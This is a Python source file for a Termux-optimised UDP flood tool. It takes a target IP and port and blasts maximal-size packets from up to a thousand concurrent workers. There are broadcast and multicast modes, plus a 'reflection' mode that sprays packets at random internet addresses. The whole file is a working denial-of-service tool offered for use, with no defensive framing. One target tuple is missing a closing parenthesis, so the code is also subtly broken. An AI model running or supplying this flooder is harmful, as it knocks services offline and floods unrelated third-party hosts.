import asyncio
import socket
import os
import struct
import argparse
import logging
import signal
import time
import random
import sys
from datetime import datetime

# --- Logging Setup ---
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%H:%M:%S',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("UDPFlooder")

# --- UDP Flooder Class ---
class UDPFlooder:
    def __init__(self, ip, port, packet_size=1024, delay=0, mode='normal',
                 payload_mode='random', custom_payload=None, use_ipv6=False, concurrency=10):
        # Input validation
        if not self.validate_ip(ip, use_ipv6) and mode not in ['broadcast', 'reflection']:
            raise ValueError(f"Invalid IP address: {ip}")
        if port < 0 or port > 65535:
            raise ValueError("Port must be 0-65535")
        
        self.ip = ip
        self.port = port
        self.mode = mode
        self.use_ipv6 = use_ipv6
        self.concurrency = min(concurrency, 1000)  # Termux safety cap
        
        # Packet size clamping
        max_size = 65527 if use_ipv6 else 65507
        self.packet_size = min(max(1, packet_size), max_size)
        self.delay = max(0.0, delay)
        
        # Payload configuration
        self.payload_mode = payload_mode
        self.custom_payload = custom_payload
        self.base_payload = self.generate_base_payload()
        
        # State management
        self.packet_counter = 0
        self.start_time = time.time()
        self.stop_event = asyncio.Event()
        self.stats_task = None
        self.socket_pool = []
        
        # Termux resource warnings
        if concurrency > 500:
            logger.warning("High concurrency may exceed Termux FD limits!")
        if mode == 'reflection':
            logger.warning("Reflection mode sends live packets to random IPs!")

    def validate_ip(self, addr, is_v6):
        try:
            socket.inet_pton(socket.AF_INET6 if is_v6 else socket.AF_INET, addr)
            return True
        except socket.error:
            return False

    def generate_base_payload(self):
        """Generate payload once during init for efficiency"""
        if self.payload_mode == 'random':
            return os.urandom(self.packet_size)
        elif self.payload_mode == 'pattern':
            pattern = b'\x00\xFF' * (self.packet_size // 2)
            return pattern[:self.packet_size]
        elif self.custom_payload:
            base = self.custom_payload.encode('utf-8', 'ignore')
            return (base * (self.packet_size // len(base) + 1))[:self.packet_size]
        return os.urandom(self.packet_size)

    async def create_socket(self):
        """Socket factory with Termux optimizations"""
        family = socket.AF_INET6 if self.use_ipv6 else socket.AF_INET
        sock = socket.socket(family, socket.SOCK_DGRAM)
        sock.setblocking(False)
        
        # Increase socket buffer size
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)
        except OSError:
            pass
            
        # Mode-specific configurations
        if self.mode == 'broadcast':
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            except OSError:
                pass
        elif self.mode == 'multicast':
            try:
                ttl = struct.pack('b', 1)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ttl)
            except OSError:
                pass
        return sock

    async def send_worker(self, worker_id):
        """Worker coroutine optimized for Termux"""
        sock = await self.create_socket()
        loop = asyncio.get_running_loop()
        
        while not self.stop_event.is_set():
            try:
                # Target selection
                if self.mode == 'reflection':
                    target = (
                        f"{random.randint(1,255)}.{random.randint(1,255)}."
                        f"{random.randint(1,255)}.{random.randint(1,255)}",
                        random.randint(1024, 65535)
                elif self.mode == 'broadcast':
                    target = ('255.255.255.255', self.port)
                else:
                    target = (self.ip, self.port)
                
                # Send operation
                await loop.sock_sendto(sock, self.base_payload, target)
                self.packet_counter += 1
                
                # Rate limiting
                if self.delay > 0:
                    await asyncio.sleep(self.delay)
                    
            except (OSError, asyncio.CancelledError) as e:
                logger.debug(f"Worker{worker_id} error: {str(e)}")
                await asyncio.sleep(0.01)

    async def stats_reporter(self):
        """Resource-efficient stats reporting"""
        start_count = self.packet_counter
        last_time = time.time()
        
        while not self.stop_event.is_set():
            await asyncio.sleep(1.0)
            
            current = self.packet_counter
            now = time.time()
            elapsed = now - last_time
            pps = (current - start_count) / elapsed if elapsed > 0 else 0
            
            sys.stdout.write(
                f"\r[STATS] Packets: {current} | "
                f"PPS: {pps:,.1f} | Workers: {self.concurrency}       "
            )
            sys.stdout.flush()
            
            start_count = current
            last_time = now

    async def start(self):
        """Start flooding with resource monitoring"""
        logger.info(f"Starting attack: {self.mode} → {self.ip}:{self.port}")
        logger.info(f"Payload: {self.payload_mode} ({self.packet_size} bytes)")
        logger.info(f"Concurrency: {self.concurrency} | Delay: {self.delay}s")
        logger.info("Press CTRL+C to stop\n")
        
        self.start_time = time.time()
        self.stop_event.clear()
        self.packet_counter = 0
        
        workers = [asyncio.create_task(self.send_worker(i)) 
                  for i in range(self.concurrency)]
        self.stats_task = asyncio.create_task(self.stats_reporter())
        
        try:
            await asyncio.gather(*workers)
        except asyncio.CancelledError:
            pass
        finally:
            self.stop()

    def stop(self):
        """Graceful shutdown procedure"""
        if not self.stop_event.is_set():
            self.stop_event.set()
            if self.stats_task:
                self.stats_task.cancel()
            
            elapsed = time.time() - self.start_time
            pps = self.packet_counter / elapsed if elapsed > 0 else 0
            
            print("\n\n[TERMINATION REPORT]")
            logger.info(f"Total packets: {self.packet_counter:,}")
            logger.info(f"Duration: {elapsed:.2f} seconds")
            logger.info(f"Average PPS: {pps:,.1f}")
            logger.info("All workers stopped")

# --- Signal Handler ---
def handle_sigint(signum, frame):
    logger.info("\nCTRL+C received - Shutting down")
    global flooder
    if flooder:
        flooder.stop()
    sys.exit(0)

# --- Argument Parser ---
def parse_args():
    parser = argparse.ArgumentParser(
        description="UDP Flooder - Termux Optimized",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    
    parser.add_argument("ip", help="Target IP address")
    parser.add_argument("port", type=int, help="Target port")
    
    parser.add_argument("-s", "--size", type=int, default=1024, 
                        help="UDP packet size (bytes)")
    parser.add_argument("-d", "--delay", type=float, default=0.0,
                        help="Delay between packets (seconds)")
    parser.add_argument("-m", "--mode", choices=['normal', 'broadcast', 'multicast', 'reflection'], 
                        default='normal', help="Attack mode")
    parser.add_argument("-p", "--payload", choices=['random', 'pattern', 'custom'], 
                        default='random', help="Payload generation mode")
    parser.add_argument("-c", "--custom", default=None, 
                        help="Custom payload text (for payload-mode=custom)")
    parser.add_argument("-6", "--ipv6", action='store_true', 
                        help="Use IPv6")
    parser.add_argument("-t", "--threads", type=int, default=10,
                        help="Concurrent workers")
    
    return parser.parse_args()

# --- Main Function ---
async def main():
    global flooder
    args = parse_args()
    
    try:
        flooder = UDPFlooder(
            ip=args.ip,
            port=args.port,
            packet_size=args.size,
            delay=args.delay,
            mode=args.mode,
            payload_mode=args.payload,
            custom_payload=args.custom,
            use_ipv6=args.ipv6,
            concurrency=args.threads
        )
        signal.signal(signal.SIGINT, handle_sigint)
        await flooder.start()
        
    except Exception as e:
        logger.error(f"Fatal initialization error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    asyncio.run(main())
